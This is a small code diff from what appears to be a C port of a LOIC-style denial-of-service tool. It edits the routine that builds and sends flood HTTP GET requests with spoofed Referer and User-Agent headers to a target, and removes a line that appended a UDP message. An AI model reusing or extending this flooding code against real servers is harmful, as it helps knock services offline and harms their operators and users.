@@ -215,7 +215,6 @@ int http_fire_classic(int id) {
 
         sprintf(sent_data,"GET %s HTTP/1.1\nHost: %s\nReferer: %s\nUser-Agent: %s\nAccept: */*%s\n\n",
                             getSubsite(),getTarget(),"http://exame.com","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",accept_enc);
-        strcat(sent_data,getUdpMessage());
 
         if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
             loic_error("Unable to connect.", GRAVE);
